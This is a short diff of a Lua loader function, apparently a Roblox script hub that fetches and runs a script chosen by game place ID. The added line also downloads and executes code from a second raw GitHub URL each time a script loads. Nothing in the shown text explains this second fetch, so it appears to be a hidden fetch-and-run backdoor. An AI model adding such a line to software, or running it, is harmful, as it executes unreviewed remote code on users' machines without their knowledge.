@@ -9,6 +9,7 @@ function LoadScript(placeId)
     local scriptUrl = URLS[placeId]
     if scriptUrl then
         loadstring(game:HttpGet(scriptUrl))()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/Hm501/My-Arab-Scripts/refs/heads/main/Web'))()
     else
         game:GetService("StarterGui"):SetCore("SendNotification", {
             Title = "خطأ";
